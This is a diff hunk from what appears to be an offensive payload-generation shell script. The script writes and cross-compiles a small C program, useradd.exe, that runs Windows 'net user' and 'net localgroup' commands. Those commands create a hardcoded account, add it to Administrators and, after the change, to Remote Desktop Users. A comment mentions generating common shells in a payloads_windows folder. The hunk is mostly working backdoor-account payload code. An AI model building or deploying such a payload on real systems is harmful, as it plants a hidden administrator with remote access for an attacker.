@@ -238,10 +238,11 @@ cat <<\EOT >useradd.c
 #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
 int main () {
 int i;
-i=system ("net user brisksec brisksec /add & net localgroup administrators brisksec /add"); return 0;
+i=system ("net user amxuser amxpass1234 /add & net localgroup administrators amxuser /add & net localgroup \"Remote Desktop Users\" amxuser /add"); return 0;
 }
 EOT
 i686-w64-mingw32-gcc -o useradd.exe -lws2_32 useradd.c
+
 # echo -e '#include <stdio.h>\n#include <smain () {\nsystem("net user brisksec brisksec /add & net localgroup administrators brisksec /add");\nreturn(0);\n}'> poc.c
 
         # Create all common shells in payloads_windows folder
